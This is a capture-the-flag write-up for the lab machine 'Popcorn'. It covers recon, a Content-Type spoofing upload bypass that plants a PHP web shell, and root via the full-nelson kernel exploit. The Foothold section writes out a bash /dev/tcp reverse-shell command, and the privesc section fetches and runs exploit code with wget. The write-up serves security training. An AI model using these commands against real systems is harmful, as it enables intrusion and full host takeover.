# Popcorn — Medium — Linux

**Date:** 2 August 2026

---

## Tags
`#linux` `#web` `#torrent-hoster` `#file-upload` `#content-type-bypass` `#webshell` `#kernel-exploit` `#full-nelson` `#privesc`

---

## What I Know

| Item       | Detail                                                          |
| ---------- | -------------------------------------------------------------- |
| Target     | popcorn.htb (10.129.44.84)                                     |
| OS         | Linux (old Ubuntu — Karmic)                                    |
| Open ports | 22 (SSH), 80 (HTTP)                                            |
| Services   | OpenSSH 5.1p1; Apache 2.2.12                                   |
| Web app    | Torrent Hoster (at /torrent/)                                  |
| Foothold   | Torrent Hoster upload → Content-Type bypass → PHP web shell    |
| Privesc    | Old kernel → full-nelson local root exploit                    |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.44.84

Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-03 21:31 +0100
Nmap scan report for 10.129.44.84
Host is up (0.062s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 31.51 seconds
```
<img width="915" height="325" alt="image" src="https://github.com/user-attachments/assets/f31c8329-1bfb-4f50-a954-d14e38c06be6" />

```
nmap -sCV -p22,80 10.129.44.84

Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-03 21:32 +0100
Nmap scan report for 10.129.44.84
Host is up (0.018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Did not follow redirect to http://popcorn.htb/
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds
```

<img width="1215" height="500" alt="image" src="https://github.com/user-attachments/assets/017beb5b-11eb-4505-89a3-990c312bb08e" />

**What each port tells me:**
- **Port 22 (SSH)** — OpenSSH **5.1p1**, a very old build, which already hints at an ancient, likely kernel-vulnerable OS. No creds yet, so a target for later.
- **Port 80 (HTTP)** — Apache **2.2.12** (also old), redirecting to popcorn.htb. My entry point; add `popcorn.htb` to `/etc/hosts` and enumerate.

> The dated SSH/Apache versions are themselves a strong signal: whatever the foothold is, an
> out-of-date kernel privesc is very likely on the table.

---

## Enumeration Log

```
OBSERVATION: Port 22 is open
WHAT IT TELLS ME: We can SSH into the server
WHAT I AM GOING TO TRY: Keep it aside
WHY: I don't have credentials
RESULT: N/A
WHAT NEXT:
- Port 80 redirects to popcorn.htb so add it to /etc/hosts and investigate
- Directory-fuzz for hidden paths
- vhost-fuzz for other subdomains
- Identify the tech stack
```

```
OBSERVATION:
- The main page is a single page with little content
- Directory fuzzing reveals /torrent/ which is worth investigating
- Nothing notable from vhost fuzzing, source, or stack
WHAT IT TELLS ME: Investigate /torrent/ to understand the app
WHAT I AM GOING TO TRY: Browse /torrent/
WHY: The path stands out as a full application
RESULT: /torrent/ hosts "Torrent Hoster", which allows registration. I registered an account and
  logged in
WHAT NEXT: Explore the features for anything abusable
```

<img width="1095" height="384" alt="image" src="https://github.com/user-attachments/assets/78e22556-25c4-4904-83ea-41e8ab6fac13" />

<img width="1779" height="866" alt="image" src="https://github.com/user-attachments/assets/c00c7cd3-1554-47d4-99c5-53732b265067" />

<img width="2201" height="737" alt="image" src="https://github.com/user-attachments/assets/744925c4-f4ed-4d75-8ae5-09774dd56da5" />

<img width="1845" height="966" alt="image" src="https://github.com/user-attachments/assets/17f5b44e-e7f4-4a66-aacb-b143e2ca8afd" />

```
OBSERVATION:
- The upload feature is interesting as Torrent Hoster has a known file-upload RCE which is discovered in my research
- The torrent upload itself only accepts .torrent files
WHAT IT TELLS ME: I need a valid .torrent to reach the upload flow, then look for a weaker check
WHAT I AM GOING TO TRY: Create a dummy .torrent, upload it, and probe the follow-up upload steps
WHY: To see what the upload flow exposes
RESULT:
- Uploaded a dummy .torrent, which led to an "edit" page with a SCREENSHOT upload field
- That screenshot upload claims to accept only images, but changing the request's Content-Type to
  image/png let me upload a PHP file and browsing to it executed it, giving a reverse shell
- Read user.txt
WHAT NEXT: Enumerate for a privesc path
```

<img width="1894" height="923" alt="image" src="https://github.com/user-attachments/assets/99711b3f-8e9f-4d6b-bab9-ab5dd1310cd5" />

<img width="1904" height="434" alt="image" src="https://github.com/user-attachments/assets/08613601-051e-42e9-9bdd-fba2e5d4007e" />

<img width="1790" height="1067" alt="image" src="https://github.com/user-attachments/assets/559349e6-e44e-473c-8ea4-586c88a1da68" />

<img width="1309" height="105" alt="image" src="https://github.com/user-attachments/assets/e18e16c8-f4b2-4ff4-8b62-224ac675c647" />

<img width="682" height="577" alt="image" src="https://github.com/user-attachments/assets/28b7aef8-e59d-4240-a00e-eb9da5d8890b" />

<img width="685" height="276" alt="image" src="https://github.com/user-attachments/assets/3d06fd28-4acc-4dda-8de3-20604d587771" />

<img width="893" height="451" alt="image" src="https://github.com/user-attachments/assets/e62665d2-03a0-4e79-8c53-bf1e17c1da9c" />

<img width="687" height="375" alt="image" src="https://github.com/user-attachments/assets/48919ede-18de-4eb3-a977-57623674e62a" />

<img width="1887" height="1036" alt="image" src="https://github.com/user-attachments/assets/d1c5ae5d-589b-461c-8cbc-e3d7ede62789" />

<img width="967" height="811" alt="image" src="https://github.com/user-attachments/assets/1652e0a0-4462-4bf0-8208-48c8b5d46685" />

```
OBSERVATION:
- linPEAS flags the kernel as very old and likely vulnerable to the "full-nelson" local root exploit
WHAT IT TELLS ME: This kernel is vulnerable to a public local-privilege-escalation exploit
  (full-nelson chains CVE-2010-4258 / CVE-2010-3849 / CVE-2010-3850)
WHAT I AM GOING TO TRY: Save the exploit as a .c file, transfer it, compile it on-target with gcc,
  and run it
WHY: A matching kernel exploit is the most direct root here
WHY (compile on target): the box is old but has gcc, so compiling locally avoids ABI/library mismatches
RESULT: Compiled and ran full-nelson → root shell → read root.txt
```

<img width="1604" height="248" alt="image" src="https://github.com/user-attachments/assets/4384baa2-9458-4246-a799-a8282c28fa9d" />

<img width="858" height="312" alt="image" src="https://github.com/user-attachments/assets/52786c28-def1-42a1-8492-dd02db117ba6" />

<img width="1162" height="243" alt="image" src="https://github.com/user-attachments/assets/fe1904a0-2936-4505-aa72-7211cad96a79" />

<img width="1032" height="772" alt="image" src="https://github.com/user-attachments/assets/41972ba5-8f07-4d69-bfe2-e67b75b53fcc" />

---

## Foothold

**How I got in:** Directory fuzzing revealed **Torrent Hoster** at `/torrent/`, which allowed self-registration. After logging in, the torrent-upload flow (which only accepts `.torrent` files) led to an edit page with a **screenshot upload**. That screenshot field claimed to accept only images, but the check relied on the request's `Content-Type` header, setting it to `image/png` while uploading a `.php` file bypassed the filter. Browsing to the uploaded PHP file executed it, giving a reverse shell as **www-data**.

**Command / exploit used:**
```
echo "10.129.44.84  popcorn.htb" | sudo tee -a /etc/hosts

# register on /torrent/, upload a dummy .torrent, then on the edit page upload a screenshot:
#   file: shell.php  (a PHP webshell / reverse shell)
#   in Burp, change  Content-Type: application/x-php  →  Content-Type: image/png
# then trigger:
curl "http://popcorn.htb/torrent/upload/<hash>.php?cmd=bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"
nc -lnvp <LPORT>          # → shell as www-data
```

**Why it worked:** Torrent Hoster's screenshot upload validated the file type from the client-supplied `Content-Type` header rather than the actual file contents/extension. Since the header is fully attacker-controlled, spoofing `image/png` let a PHP file through into a web-served directory, where the server happily executed it.

---

## Privilege Escalation

**Path taken (www-data → root):** The box runs a very old Ubuntu (Karmic) with a correspondingly old kernel. linPEAS flagged it as vulnerable to the **full-nelson** local-root exploit (a public PoC chaining several 2010 kernel/econet vulnerabilities CVE-2010-4258, CVE-2010-3849, CVE-2010-3850). I saved the exploit's `.c` source, transferred it to the target, compiled it on-box with `gcc` (the machine has a compiler), and ran it to get a root shell and then read root.txt.

```
# on attacker: serve the exploit
# on target:
wget http://<LHOST>/full-nelson.c -O /tmp/fn.c
gcc /tmp/fn.c -o /tmp/fn
/tmp/fn                    # → root shell
id                         # uid=0(root)
```

**Why it worked:** The kernel was years out of date and never patched against the econet/privilege bugs full-nelson abuses, so a local unprivileged user could escalate directly to root. (DirtyCow also works on this box as an alternative.) It's the classic "unpatched legacy host" privesc, the fix is simply keeping the kernel current.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Registered on the Torrent Hoster app, uploaded a PHP web shell through the screenshot field by spoofing the `Content-Type` to `image/png`, and triggered it for a www-data shell.
2. **Privesc technique in one sentence:** Compiled and ran the full-nelson kernel exploit against the box's ancient, unpatched kernel to get a root shell.
